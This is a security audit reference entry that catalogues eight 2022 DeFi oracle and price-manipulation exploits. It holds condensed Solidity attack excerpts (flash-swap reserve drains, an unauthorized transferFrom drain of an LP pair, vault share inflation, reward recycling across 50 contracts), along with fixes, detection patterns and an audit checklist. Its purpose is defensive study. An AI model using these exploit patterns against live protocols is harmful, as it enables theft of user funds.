---
protocol: Multi-Protocol
chain: BSC, Fantom
category: oracle_price_manipulation
vulnerability_type: AMM-Based Oracle Price Manipulation

# Pattern Identity (Required)
root_cause_family: missing_validation
pattern_key: AMM-Based Oracle Price Manipulation |  |  | Protocol drain via manipulated prices, reward inflation, vault extraction

# Interaction Scope
interaction_scope: cross_protocol
attack_type:
  - Flash loan/swap pair reserve drain
  - Public token function pair manipulation
  - batchToken minting into LP pair
  - Broken transferFrom LP drain
  - Flash loan vault share inflation
  - Spot price swap proxy arbitrage
  - balanceOf-based reward recycling
source: DeFiHackLabs
total_exploits_analyzed: 8
total_losses: "$7M+"
affected_component:
  - AMM LP pair reserves
  - Price oracle functions
  - Reward/claim contracts
  - Vault share pricing
  - Swap proxy contracts
  - Token transfer validation
primitives:
  - flash_loan
  - price_manipulation
  - amm_spot_price
  - pair_reserve_drain
  - vault_share_inflation
  - reward_recycling
severity: CRITICAL
impact: Protocol drain via manipulated prices, reward inflation, vault extraction
exploitability: High
financial_impact: "$7M+ aggregate"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "from"
  - "sync"
  - "abuse"
  - "claim"
  - "deposit"
  - "getPrice"
  - "withdraw"
  - "balanceOf"
  - "batchToken"
  - "msg.sender"
  - "claimReward"
  - "getReserves"
  - "pancakeCall"
  - "testExploit"
  - "transferFrom"
path_keys:
  - "flash_swap_reserve_drain_inflated_reward_claims"
  - "multi_function_reward_drain_via_pair_price_manipulation"
  - "batchtoken_mint_directly_into_lp_pair"
  - "public_token_function_skews_lp_reserves"
  - "broken_transferfrom_drains_lp_pair_reserves"
  - "flash_loan_vault_share_inflation"
tags:
  - defihacklabs
  - oracle-manipulation
  - price-manipulation
  - flash-loan
  - flash-swap
  - pair-drain
  - spot-price
  - vault-inflation
  - reward-balanceof
  - bsc-token
  - ATK
  - YYDS
  - ZoomproFinance
  - SpaceGodzilla
  - NOVO
  - OneRing
  - APC
  - NewFreeDAO
---

# DeFiHackLabs BSC Oracle & Price Manipulation Patterns (2022)

## References & Source Reports

| Label | Source | Path / URL |
|-------|--------|------------|
| [APC-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-12/APC_exp.sol` |
| [ATK-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/ATK_exp.sol` |
| [NEWFREEDAO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-09/NewFreeDAO_exp.sol` |
| [NOVO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-05/Novo_exp.sol` |
| [ONERING-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-03/OneRing_exp.sol` |
| [SPACEGODZILL-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-07/SpaceGodzilla_exp.sol` |
| [YYDS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-09/Yyds_exp.sol` |
| [ZOOMPROFINAN-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-09/ZoomproFinance_exp.sol` |

---


## Overview

This entry catalogs 8 AMM-based price manipulation exploits from 2022 sourced from [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs). These represent the most common DeFi exploit pattern: using flash loans or public functions to manipulate AMM spot prices that protocols incorrectly rely on for pricing, rewards, or share calculations.

**Categories covered:**
1. **Flash Swap Pair Reserve Drain** — Drain LP reserves to manipulate `getPrice()` (ATK, YYDS)
2. **Public Function Pair Manipulation** — Externally callable token functions skew LP reserves (SpaceGodzilla)
3. **batchToken Minting into LP Pair** — Privileged mint directly into pair inflates price (ZoomproFinance)
4. **Broken transferFrom LP Drain** — Missing authorization allows draining LP reserves (NOVO)
5. **Flash Loan Vault Share Inflation** — Deposit manipulates share-to-asset ratio (OneRing)
6. **Spot Price Swap Proxy Arbitrage** — Swap proxy uses manipulable AMM spot price (APC)
7. **balanceOf-Based Reward Recycling** — Same tokens claim rewards across 50 contracts (NewFreeDAO)

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `missing_validation` |
| Pattern Key | `AMM-Based Oracle Price Manipulation |  |  | Protocol drain via manipulated prices, reward inflation, vault extraction` |
| Severity | CRITICAL |
| Impact | Protocol drain via manipulated prices, reward inflation, vault extraction |
| Interaction Scope | `cross_protocol` |
| Chain(s) | BSC, Fantom |


### Valid Bug Signals

- Pricing, reward, vault-share, or swap-proxy logic reads AMM pair reserves, raw pair balances, or vault balances that a flash swap or public token function can distort.
- Token-level functions can mint, swap, sync, skim, or move assets into/out of LP pairs without tight access control or pair-address guards.
- `transferFrom` or approval logic lets an attacker drain LP reserves or move tokens from the pair without valid allowance from the pair owner.
- Rewards are computed from `balanceOf(msg.sender)` or current token holdings, allowing the same capital to be recycled across reward contracts or claims.
- A same-block deposit/withdraw, flash swap callback, or proxy swap path converts the manipulated price into protocol loss.

### False Positive Guards

- Public token functions are not enough by themselves; confirm they can change the reserves or balances used by a value-sensitive protocol calculation.
- `getReserves()` in router-style quoting is lower risk unless the quoted value is trusted for minting, rewards, borrowing, liquidation, or protected swap execution.
- Reward systems based on tracked staking balances, lockups, or non-transferable accounting should not be flagged solely because they also expose `balanceOf()`.
- Pair reserve movement must be economically meaningful after fees, caps, and liquidity depth; shallow proof-of-concept movement without a profit sink is not a valid high-severity issue.
- Same-block vault operations are lower risk when share price is based on tracked assets, minimum shares/assets are enforced, and direct donations cannot affect accounting.

### Code Patterns to Look For

```text
- `getPrice()`, `tokenPrice()`, or `claimReward()` reading pair `getReserves()` or `balanceOf(pair)`
- public `batchToken`, `batchMint`, `swapAndLiquify`, `swapTokensForOther`, `abuse`, or `sync`-triggering functions
- `transferFrom(from, to, amount)` without `msg.sender == from` or allowance validation
- `depositSafe`, `withdraw`, or vault exchange-rate math with no same-block/cooldown guard
- reward loops where one balance snapshot is reused across many contracts or claim targets
```


## Vulnerability Description

### Root Cause Analysis

All 8 exploits share a common root cause: **protocols use AMM spot prices or on-chain balances as oracles**, which can be manipulated within a single transaction via flash loans.

1. **Direct Reserve Manipulation**: Flash-swapping tokens out of an LP pair temporarily changes the reserve ratio, causing any price function reading those reserves to return a manipulated value (ATK, YYDS)
2. **Public State-Changing Functions**: Token contracts with publicly callable functions that move tokens into/out of LP pairs allow external price manipulation (SpaceGodzilla, ZoomproFinance)
3. **Missing transferFrom Authorization**: When `transferFrom()` doesn't validate approvals, attackers can drain LP pair reserves directly (NOVO)
4. **Balance-Based Share Pricing**: Vaults that calculate share prices from `balanceOf()` rather than tracked deposits are vulnerable to flash-loan deposit manipulation (OneRing)
5. **Instant Balance Snapshots for Rewards**: Reward contracts that check `balanceOf(msg.sender)` without requiring locked deposits allow token recycling across multiple contracts (NewFreeDAO)

### Attack Flow Pattern

```
┌─────────────────────────────────────────────┐
│ 1. Flash Loan / Flash Swap                  │
│    (Acquire large token position)           │
├─────────────────────────────────────────────┤
│ 2. Price Manipulation                       │
│    - Drain LP pair reserves, OR             │
│    - Deposit into vault, OR                 │
│    - Call public function on token          │
├─────────────────────────────────────────────┤
│ 3. Exploit Manipulated Price                │
│    - claimReward() at inflated price, OR    │
│    - withdraw() at inflated share value, OR │
│    - swap via proxy at inflated rate        │
├─────────────────────────────────────────────┤
│ 4. Unwind & Repay                           │
│    - Restore reserves                        │
│    - Repay flash loan                        │
│    - Profit = extracted - borrowed           │
└─────────────────────────────────────────────┘
```

---

## Vulnerable Pattern Examples

### Pattern 1: Flash Swap Reserve Drain → Inflated Reward Claims

> **pathShape**: `atomic`

**Severity**: 🔴 CRITICAL | **Loss**: ~$127K | **Protocol**: ATK (Journey of Awakening) | **Chain**: BSC

The ATK protocol's reward contract uses `getPrice()` which reads the ATK/BUSDT pair reserves. Flash-swapping nearly all BUSDT from the pair temporarily makes ATK appear extremely valuable, allowing inflated reward claims.

```solidity
// @audit-issue getPrice() reads AMM spot price — manipulable via flash swap
function testExploit() public {
    // Step 1: Flash-swap nearly all BUSDT from the ATK/BUSDT pair
    uint256 swapamount = BUSDT_TOKEN.balanceOf(address(ATK_BUSDT_PAIR)) - 3 * 1e18;
    // @audit Pair reserves go from (X ATK, Y BUSDT) to (X ATK, 3 BUSDT)
    // getPrice() now returns enormously inflated ATK value
    ATK_BUSDT_PAIR.swap(swapamount, 0, address(this), new bytes(1));
}

function pancakeCall(address, uint256, uint256, bytes calldata) external {
    // Step 2: Claim rewards at manipulated price
    // @audit getPrice() reads pair with Y BUSDT ≈ 0 → ATK price appears infinite
    vm.prank(EXPLOIT_CONTRACT);
    EXPLOIT_AUX_CONTRACT.call(abi.encodeWithSignature("claimToken1()"));
    
    // Step 3: Repay flash swap with profit
    BUSDT_TOKEN.transfer(address(ATK_BUSDT_PAIR), swapamount * 10000 / 9975 + 1);
}
```

**Reference**: [DeFiHackLabs/src/test/2022-10/ATK_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/ATK_exp.sol) | Block: 22,102,838

---

### Pattern 2: Multi-function Reward Drain via Pair Price Manipulation

> **pathShape**: `atomic`

**Severity**: 🟠 HIGH | **Loss**: USDT profit | **Protocol**: YYDS | **Chain**: BSC

Similar to ATK but exploits multiple reward claim functions (`claim`, `withdrawReturnAmountByReferral`, `withdrawReturnAmountByMerchant`, `withdrawReturnAmountByConsumer`) all dependent on the same manipulated pair price.

```solidity
// @audit-issue Multiple reward functions all read from same manipulable pair
function pancakeCall(address, uint256, uint256, bytes calldata) external {
    // Flash-swap drained nearly all USDT from USDT/YYDS pair
    
    // @audit All reward functions read pair price — all return inflated values
    targetClaim.claim(address(this));
    targetWihtdraw.withdrawReturnAmountByReferral();
    targetWihtdraw.withdrawReturnAmountByMerchant();
    targetWihtdraw.withdrawReturnAmountByConsumer();
    
    // Dump YYDS back into pair to repay
    uint256 yydsInContract = YYDS.balanceOf(address(this));
    YYDS.transfer(address(Pair), yydsInContract);
    
    // Repay USDT flash swap
    USDT.transfer(address(Pair), repayAmount);
}
```

**Reference**: [DeFiHackLabs/src/test/2022-09/Yyds_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/Yyds_exp.sol) | Block: 21,157,025

---

### Pattern 3: batchToken Mint Directly Into LP Pair

> **pathShape**: `atomic`

**Severity**: 🔴 CRITICAL | **Loss**: ~$3M | **Protocol**: ZoomproFinance | **Chain**: BSC

The Zoom protocol has a `batchToken()` function that can mint FakeUSDT directly into the LP pair address, changing the reserve ratio without going through the pair's swap function. After `sync()`, the price oracle reflects the manipulated reserves.

```solidity
// @audit-issue batchToken() mints tokens directly into pair reserves
function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
    // Step 1: Buy Zoom with 3M USDT flash loan
    IUSD(swap).buy(ba);  // ba = [Zoom amount to buy]
    
    // Step 2: Mint 1M FakeUSDT directly into the FakeUSDT/Zoom pair
    // @audit This changes the pair's token balance without a swap event
    IUSD(batch).batchToken(
        n1,   // [pair_address]
        n2,   // [1_000_000 ether]
        fUSDT // FakeUSDT token address
    );
    
    // Step 3: Force pair to update reserves with manipulated balances
    // @audit sync() reads pair's actual token balances → price is now distorted
    IUSD(pp).sync();
    
    // Step 4: Sell Zoom at inflated price
    // @audit Zoom appears more valuable due to skewed reserves
    IUSD(swap).sell(baz);
    
    // Repay flash loan, keep ~$3M profit
}
```

**Reference**: [DeFiHackLabs/src/test/2022-09/ZoomproFinance_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/ZoomproFinance_exp.sol) | Block: 21,055,930

---

### Pattern 4: Public Token Function Skews LP Reserves

> **pathShape**: `atomic`

**Severity**: 🟠 HIGH | **Loss**: ~$25K | **Protocol**: SpaceGodzilla | **Chain**: BSC

The SpaceGodzilla token has publicly callable `swapTokensForOther()` and `swapAndLiquifyStepv1()` functions that perform swaps affecting the LP pair's reserves — enabling sandwich-style price manipulation.

```solidity
// @audit-issue Public functions on token contract manipulate LP reserves
function testExploit() public {
    // Step 1: Call public function with huge amount → skews pair reserves
    // @audit Anyone can call swapTokensForOther() — moves tokens in/out of pair
    ISpaceGodzilla(SpaceGodzilla).swapTokensForOther(
        69_127_461_036_369_179_405_415_017_714
    );
    
    // Step 2: Buy SpaceGodzilla at manipulated (low) price
    IERC20(USDT).transfer(CakeLP, trans_usdt_balance);
    Uni_Pair_V2(CakeLP).swap(amount0Out, 0, address(this), "");
    
    // Step 3: Trigger another price manipulation
    // @audit Another public function that further distorts LP state
    ISpaceGodzilla(SpaceGodzilla).swapAndLiquifyStepv1();
    
    // Step 4: Sell SpaceGodzilla at manipulated (high) price → profit
    IERC20(SpaceGodzilla).transfer(CakeLP, SpaceGodzilla_balance);
    Uni_Pair_V2(CakeLP).swap(0, amount1Out, address(this), "");
}
```

**Reference**: [DeFiHackLabs/src/test/2022-07/SpaceGodzilla_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/SpaceGodzilla_exp.sol) | Block: 19,523,980

---

### Pattern 5: Broken transferFrom Drains LP Pair Reserves

> **pathShape**: `atomic`

**Severity**: 🔴 CRITICAL | **Loss**: ~17 WBNB | **Protocol**: NOVO | **Chain**: BSC

The NOVO token's `transferFrom()` doesn't validate approval, allowing anyone to transfer tokens from any address. The attacker uses this to drain NOVO from the LP pair, then sells after `sync()` at the manipulated price.

```solidity
// @audit-issue transferFrom() has no approval check — anyone can transfer from anyone
function testExploit() public {
    // Step 1: Buy some NOVO with borrowed WBNB
    PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        172e17, 1, path, address(this), block.timestamp
    );
    
    // Step 2: Drain NOVO from LP pair WITHOUT approval
    // @audit transferFrom(pair, token, amount) succeeds without any allowance
    novo.transferFrom(
        address(novoLP),     // from = LP pair (no approval!)
        address(novo),       // to = token contract
        113_951_614_762_384_370  // drain most NOVO from pair
    );
    
    // Step 3: Update pair reserves
    // @audit Pair now has far less NOVO → NOVO price appears inflated
    novoLP.sync();
    
    // Step 4: Sell attacker's NOVO at inflated price
    PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        novo.balanceOf(address(this)), 1, path, address(this), block.timestamp
    );
}
```

**Reference**: [DeFiHackLabs/src/test/2022-05/Novo_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-05/Novo_exp.sol) | Block: 18,225,002

---

### Pattern 6: Flash Loan Vault Share Inflation

> **pathShape**: `atomic`

**Severity**: 🔴 CRITICAL | **Loss**: ~$2M | **Protocol**: OneRing Finance | **Chain**: Fantom

The OneRing vault calculates share prices from `balanceOf(address(this))`. A massive flash-loaned deposit inflates the share price, and withdrawing immediately after extracts more than deposited.

```solidity
// @audit-issue Vault share price based on balanceOf — manipulable via flash loan
function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
    // Flash loan 80M USDC
    usdc.approve(address(vault), type(uint256).max);
    
    // Step 1: Deposit into vault → shares minted based on current balanceOf ratio
    // @audit Large deposit skews the share-to-asset ratio
    vault.depositSafe(amount0, address(usdc), 1);
    
    // Step 2: Withdraw immediately
    // @audit Share price reflects the inflated balance → attacker gets more than deposited
    vault.withdraw(vault.balanceOf(address(this)), address(usdc));
    
    // Step 3: Repay flash loan
    // Profit = withdrawal - repayment amount
    usdc.transfer(address(pair), 80_000_000 * 1e6 * 1000 / 997 + 1);
}
```

**Reference**: [DeFiHackLabs/src/test/2022-03/OneRing_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/OneRing_exp.sol) | Block: 34,041,499 (Fantom)

---

### Pattern 7: Spot Price Swap Proxy Arbitrage

> **pathShape**: `atomic`

**Severity**: 🔴 CRITICAL | **Loss**: ~$500K | **Protocol**: APC | **Chain**: BSC

The APC/MUSD swap proxy uses the APC/USDT AMM pair's spot price for rate calculation. The attacker pumps APC price, swaps APC→MUSD at inflated rate through the proxy, dumps APC to restore price, then swaps MUSD→APC at normal rate — profiting from the asymmetry.

```solidity
// @audit-issue Swap proxy uses AMM spot price — pump & dump arbitrage
function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
    // Step 1: Flash loan 500K USDT
    // Step 2: Pump APC price on PancakeSwap
    USDTToAPC();  // Buy all APC with 500K USDT
    
    // Step 3: Swap APC→MUSD at inflated price via proxy
    // @audit Proxy reads APC/USDT pair → sees inflated APC price → gives excess MUSD
    transSwap.swap(address(APC), address(MUSD), 100_000 * 1e18);
    
    // Step 4: Dump APC back (restores normal price)
    APCToUSDT();
    
    // Step 5: Swap MUSD→APC at now-NORMAL (lower) price
    // @audit Proxy now sees normal APC price → gives APC at fair rate
    transSwap.swap(address(MUSD), address(APC), MUSD.balanceOf(address(this)));
    
    // Step 6: Sell excess APC for profit
    APCToUSDT();
    // Repay flash loan, keep ~$500K profit
}
```

**Reference**: [DeFiHackLabs/src/test/2022-12/APC_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/APC_exp.sol) | Block: 23,527,906

---

### Pattern 8: balanceOf-Based Reward Recycling Across Contracts

> **pathShape**: `atomic`

**Severity**: 🔴 CRITICAL | **Loss**: ~$1.25M (4,481 BNB) | **Protocol**: NewFreeDAO (NFD) | **Chain**: BSC

The NFD reward contract calculates rewards based on `balanceOf(msg.sender)` at the time of the call — with no deposit locking or tracking. The attacker creates 50 child contracts, transfers the same tokens to each, claims rewards, and transfers tokens to the next contract.

```solidity
// @audit-issue Reward based on instantaneous balanceOf — same tokens used 50 times
function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
    // Flash loan 250 WBNB → swap to NFD
    PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        250 * 1e18, 1, path, address(this), block.timestamp
    );
    
    uint256 nfdAmount = nfd.balanceOf(address(this));
    
    // @audit Create 50 contracts, transfer same tokens, claim rewards from each
    for (uint8 i; i < 50; i++) {
        Exploit exploit = new Exploit();
        IERC20(nfd).transfer(address(exploit), nfdAmount);
        exploit.abuse();  // Claims reward based on balanceOf → returns tokens
        // @audit Same tokens recycled to next contract
    }
    
    // Sell all accumulated NFD rewards
    PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        nfd.balanceOf(address(this)), 1, path, address(this), block.timestamp
    );
    // Repay flash loan, profit ~4,481 BNB
}

contract Exploit {
    function abuse() external {
        // @audit balanceOf(address(this)) is checked — returns full balance
        REWARD_CONTRACT.call(abi.encodeWithSignature("0x6811e3b9"));
        // Transfer tokens back to attacker for reuse
        nfd.transfer(msg.sender, nfd.balanceOf(address(this)));
    }
}
```

**Reference**: [DeFiHackLabs/src/test/2022-09/NewFreeDAO_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/NewFreeDAO_exp.sol) | Block: 21,140,434

---

## Impact Analysis

| Protocol | Date | Loss | Root Cause | Chain |
|----------|------|------|-----------|-------|
| ZoomproFinance | Sep 2022 | ~$3M | batchToken mints into LP pair | BSC |
| OneRing | Mar 2022 | ~$2M | Flash loan vault share inflation | Fantom |
| NewFreeDAO | Sep 2022 | ~$1.25M | balanceOf reward recycling ×50 | BSC |
| APC | Dec 2022 | ~$500K | Spot price swap proxy arbitrage | BSC |
| ATK | Oct 2022 | ~$127K | Flash swap pair reserve drain | BSC |
| SpaceGodzilla | Jul 2022 | ~$25K | Public token function skews LP | BSC |
| NOVO | May 2022 | ~17 WBNB | Broken transferFrom drains LP | BSC |
| YYDS | Sep 2022 | Unknown | Multi-function pair price drain | BSC |

**Aggregate**: Over $7M in losses from AMM-based oracle manipulation.

---

## Secure Implementation

### Fix 1: Use TWAP or External Oracle (Not AMM Spot Price)

```solidity
// SECURE: Use Chainlink oracle or TWAP instead of AMM spot price
contract SecureRewardContract {
    AggregatorV3Interface public priceFeed;  // Chainlink oracle
    
    function getTokenPrice() internal view returns (uint256) {
        // @audit-fix Chainlink price cannot be flash-loan-manipulated
        (, int256 price,,,) = priceFeed.latestRoundData();
        require(price > 0, "Invalid price");
        return uint256(price);
    }
    
    // Alternative: Use Uniswap V3 TWAP
    function getTokenPriceTWAP() internal view returns (uint256) {
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = 1800;  // 30 minutes ago
        secondsAgos[1] = 0;     // now
        (int56[] memory tickCumulatives,) = pool.observe(secondsAgos);
        // @audit-fix TWAP is resistant to single-block manipulation
        int24 avgTick = int24((tickCumulatives[1] - tickCumulatives[0]) / 1800);
        return OracleLibrary.getQuoteAtTick(avgTick, 1e18, token0, token1);
    }
}
```

### Fix 2: Tracked Deposits Instead of balanceOf for Rewards

```solidity
// SECURE: Track deposits with time locks — prevent recycling
contract SecureRewardContract {
    mapping(address => uint256) public deposited;
    mapping(address => uint256) public depositTimestamp;
    uint256 public constant MIN_LOCK = 1 days;
    
    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        // @audit-fix Track actual deposits — not just balanceOf
        deposited[msg.sender] += amount;
        depositTimestamp[msg.sender] = block.timestamp;
    }
    
    function claimReward() external {
        // @audit-fix Use tracked deposit, not balanceOf(msg.sender)
        uint256 userDeposit = deposited[msg.sender];
        // @audit-fix Enforce minimum lock duration
        require(
            block.timestamp >= depositTimestamp[msg.sender] + MIN_LOCK,
            "Still locked"
        );
        uint256 reward = _calculateReward(userDeposit);
        _distributeReward(msg.sender, reward);
    }
}
```

### Fix 3: Flash Loan Guard for Vault Deposits

```solidity
// SECURE: Prevent same-block deposit + withdraw
contract SecureVault is ERC4626 {
    mapping(address => uint256) public lastDepositBlock;
    
    function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {
        lastDepositBlock[receiver] = block.number;
        return super.deposit(assets, receiver);
    }
    
    function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {
        // @audit-fix Prevent same-block withdraw — blocks flash loan attacks
        require(
            block.number > lastDepositBlock[owner],
            "Cannot withdraw in same block as deposit"
        );
        return super.withdraw(assets, receiver, owner);
    }
}
```

---

## Detection Patterns

### Static Analysis

```yaml
- pattern: "getReserves\\(\\)|reserve0|reserve1"
  check: "Verify price is NOT derived from AMM pair reserves — use oracle/TWAP"
  
- pattern: "getPrice\\(\\)|tokenPrice\\(\\)|getTokenPrice"
  check: "Verify price function doesn't read from manipulable AMM pair"
  
- pattern: "balanceOf\\(msg\\.sender\\).*reward|reward.*balanceOf"
  check: "Verify rewards use tracked deposits, not instantaneous balance"
  
- pattern: "depositSafe|deposit.*withdraw.*same.*function"
  check: "Verify vault prevents same-block deposit and withdrawal"
  
- pattern: "batchToken|batchMint|bulkMint"
  check: "Verify batch functions cannot mint directly to LP pair addresses"
  
- pattern: "swapTokensForOther|swapAndLiquify|convertDustToEarned"
  check: "Verify token-level swap functions have access control"
  
- pattern: "transferFrom.*pair|transferFrom.*LP"
  check: "Verify transferFrom validates msg.sender has approval from 'from' address"
  
- pattern: "sync\\(\\)|skim\\(\\)"
  check: "Check if sync/skim is called after external state manipulation"
```

### Invariant Checks

```
INV-ORACLE-001: Token price must not change >10% within a single block
INV-ORACLE-002: Reward calculations must use tracked deposits, not balanceOf snapshots
INV-ORACLE-003: Vault deposit and withdrawal must be separated by at least 1 block
INV-ORACLE-004: No external function should be able to mint tokens directly into LP pairs
INV-ORACLE-005: transferFrom must require msg.sender == from || allowance[from][msg.sender] >= amount
INV-ORACLE-006: Public token functions must not perform swaps that affect LP pair reserves
INV-ORACLE-007: Swap proxy pricing must use oracle/TWAP, not AMM spot price
INV-ORACLE-008: Same token balance cannot be used for rewards across multiple contracts in one TX
```

---

## Audit Checklist

- [ ] **Price Source**: Does the protocol use AMM pair reserves or `getReserves()` for pricing? (CRITICAL — use TWAP or oracle instead)
- [ ] **Flash Loan Resistance**: Can a flash loan manipulate the price source within a single transaction?
- [ ] **Reward Calculation**: Are rewards based on `balanceOf(msg.sender)` or tracked deposits?
- [ ] **Vault Same-Block**: Can users deposit and withdraw in the same block?
- [ ] **Batch Functions**: Can any batch/bulk function mint or transfer tokens directly to LP pair addresses?
- [ ] **Public Swap Functions**: Do any token-level functions perform swaps that affect LP reserves? Are they access-controlled?
- [ ] **transferFrom Authorization**: Does `transferFrom` properly validate `msg.sender` has approval from `from`?
- [ ] **Sync/Skim Usage**: Is `sync()` called after external manipulation that changes pair token balances?

---

## Real-World Examples

| Protocol | Date | Loss | TX/Reference |
|----------|------|------|-------------|
| ZoomproFinance | Sep 2022 | ~$3M | Block 21,055,930 (BSC) |
| OneRing | Mar 2022 | ~$2M | Block 34,041,499 (Fantom) |
| NewFreeDAO | Sep 2022 | ~$1.25M | Block 21,140,434 (BSC) |
| APC | Dec 2022 | ~$500K | Block 23,527,906 (BSC) |
| ATK | Oct 2022 | ~$127K | Block 22,102,838 (BSC) |
| SpaceGodzilla | Jul 2022 | ~$25K | Block 19,523,980 (BSC) |
| NOVO | May 2022 | ~17 WBNB | Block 18,225,002 (BSC) |
| YYDS | Sep 2022 | Unknown | Block 21,157,025 (BSC) |

---

## Keywords

oracle_manipulation, price_manipulation, amm_spot_price, flash_loan, flash_swap, pair_reserve_drain, getReserves, getPrice, vault_share_inflation, depositSafe, balanceOf_reward, reward_recycling, batchToken, swapTokensForOther, swapAndLiquify, broken_transferFrom, sync_manipulation, TWAP, spot_price, swap_proxy, defihacklabs, ATK, YYDS, ZoomproFinance, SpaceGodzilla, NOVO, OneRing, APC, NewFreeDAO
